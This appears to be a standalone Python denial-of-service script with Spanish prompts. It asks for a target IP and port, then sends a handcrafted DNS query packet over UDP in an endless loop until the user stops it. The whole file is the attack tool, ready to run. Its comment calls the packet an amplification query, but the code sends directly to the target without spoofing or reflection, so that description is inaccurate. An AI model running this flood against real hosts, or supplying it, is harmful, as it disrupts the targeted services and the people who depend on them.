import socket

def build_dns_payload():
    # Simple DNS query for amplification (Type A, domain: .)
    # Transaction ID (2 bytes), flags (2 bytes), questions (2 bytes), answer RRs (2), authority RRs (2), additional RRs (2)
    # Query: root (0), type A (1), class IN (1)
    return b'\x00\x00' + b'\x00\x00' + b'\x00\x01' + b'\x00\x00' * 3 + b'\x00' + b'\x00\x01' + b'\x00\x01'

def main():
    target_ip = input("Ingresa la IP de destino: ").strip()
    target_port = int(input("Ingresa el puerto de destino: ").strip())

    dns_payload = build_dns_payload()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        while True:
            sock.sendto(dns_payload, (target_ip, target_port))
            # Puedes agregar un pequeño delay si quieres limitar la velocidad
            # time.sleep(0.001)
    except KeyboardInterrupt:
        print("\nEnvío detenido por el usuario.")
    finally:
        sock.close()

if __name__ == "__main__":
    main()
